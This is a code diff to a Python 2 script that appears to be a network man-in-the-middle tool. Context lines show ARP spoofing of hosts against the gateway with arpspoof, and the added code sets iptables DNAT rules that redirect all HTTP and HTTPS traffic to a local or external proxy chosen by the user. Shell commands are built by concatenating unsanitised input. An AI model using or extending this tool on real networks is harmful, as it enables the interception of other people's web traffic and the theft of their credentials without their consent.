@@ -28,7 +28,9 @@ import os,time,argparse,socket,pprint
 
 parser = argparse.ArgumentParser()
 
-
+parser.add_argument('-proxy', action='store', default="none",
+                    dest='loadproxy',
+                    help='Route HTTP and HTTPS traffic to an Internal or External Transparent Proxy .. \n Example: -proxy 192.168.1.5:3128')
 
 parser.add_argument('-trafficlimit', action='store', default="none",
                     dest='trafflimit',
@@ -315,7 +317,12 @@ if not(results.spoof=="none"): #Works slowly(256 pings) but once has started all
           os.popen("nohup arpspoof -t "+ip+" "+dgip+" >/dev/null 2>&1 &")
           print ip+"\n"
 
-
+if not(results.loadproxy=="none"): ## ONLY HTTP & HTTPS
+                # Proxy should be (socket format or just ip)  example 192.168.1.1:3128 or 1.1.1.1 
+                #can be an external proxy or local
+                proxy=results.loadproxy
+                os.popen("iptables -t nat -A PREROUTING -m multiport -p tcp --dports 80,443 -j DNAT --to "+proxy)
+                os.popen("iptables -t nat -I FORWARD -d "+proxy+" -j ACCEPT")
     
 
 
